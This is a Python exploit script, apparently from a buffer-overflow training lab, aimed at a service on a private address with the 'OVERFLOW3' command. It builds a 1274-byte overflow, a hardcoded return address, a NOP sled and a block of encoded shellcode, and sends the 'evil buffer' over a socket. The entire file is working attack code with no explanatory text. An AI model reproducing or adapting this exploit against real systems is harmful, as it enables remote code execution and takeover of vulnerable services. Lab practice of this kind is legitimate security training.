#!/usr/bin/env python3

import socket

ip = "10.10.16.223"
port = 1337

prefix = "OVERFLOW3 "
offset = 1274
overflow = "A" * offset
retn = "\x03\x12\x50\x62" # 62501203
padding = "\x90" * 16
payload = ("\xfc\xbb\xe3\x87\xa3\x63\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x1f\x6f\x21\x63\xdf"
"\x70\x46\xed\x3a\x41\x46\x89\x4f\xf2\x76\xd9\x1d\xff\xfd\x8f"
"\xb5\x74\x73\x18\xba\x3d\x3e\x7e\xf5\xbe\x13\x42\x94\x3c\x6e"
"\x97\x76\x7c\xa1\xea\x77\xb9\xdc\x07\x25\x12\xaa\xba\xd9\x17"
"\xe6\x06\x52\x6b\xe6\x0e\x87\x3c\x09\x3e\x16\x36\x50\xe0\x99"
"\x9b\xe8\xa9\x81\xf8\xd5\x60\x3a\xca\xa2\x72\xea\x02\x4a\xd8"
"\xd3\xaa\xb9\x20\x14\x0c\x22\x57\x6c\x6e\xdf\x60\xab\x0c\x3b"
"\xe4\x2f\xb6\xc8\x5e\x8b\x46\x1c\x38\x58\x44\xe9\x4e\x06\x49"
"\xec\x83\x3d\x75\x65\x22\x91\xff\x3d\x01\x35\x5b\xe5\x28\x6c"
"\x01\x48\x54\x6e\xea\x35\xf0\xe5\x07\x21\x89\xa4\x4f\x86\xa0"
"\x56\x90\x80\xb3\x25\xa2\x0f\x68\xa1\x8e\xd8\xb6\x36\xf0\xf2"
"\x0f\xa8\x0f\xfd\x6f\xe1\xcb\xa9\x3f\x99\xfa\xd1\xab\x59\x02"
"\x04\x7b\x09\xac\xf7\x3c\xf9\x0c\xa8\xd4\x13\x83\x97\xc5\x1c"
"\x49\xb0\x6c\xe7\x1a\xb5\x74\xcf\x02\xa1\x76\x0f\xa2\x6e\xfe"
"\xe9\xae\x9e\x56\xa2\x46\x06\xf3\x38\xf6\xc7\x29\x45\x38\x43"
"\xde\xba\xf7\xa4\xab\xa8\x60\x45\xe6\x92\x27\x5a\xdc\xba\xa4"
"\xc9\xbb\x3a\xa2\xf1\x13\x6d\xe3\xc4\x6d\xfb\x19\x7e\xc4\x19"
"\xe0\xe6\x2f\x99\x3f\xdb\xae\x20\xcd\x67\x95\x32\x0b\x67\x91"
"\x66\xc3\x3e\x4f\xd0\xa5\xe8\x21\x8a\x7f\x46\xe8\x5a\xf9\xa4"
"\x2b\x1c\x06\xe1\xdd\xc0\xb7\x5c\x98\xff\x78\x09\x2c\x78\x65"
"\xa9\xd3\x53\x2d\xc9\x31\x71\x58\x62\xec\x10\xe1\xef\x0f\xcf"
"\x26\x16\x8c\xe5\xd6\xed\x8c\x8c\xd3\xaa\x0a\x7d\xae\xa3\xfe"
"\x81\x1d\xc3\x2a\x81\xa1\x3b\xd5")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")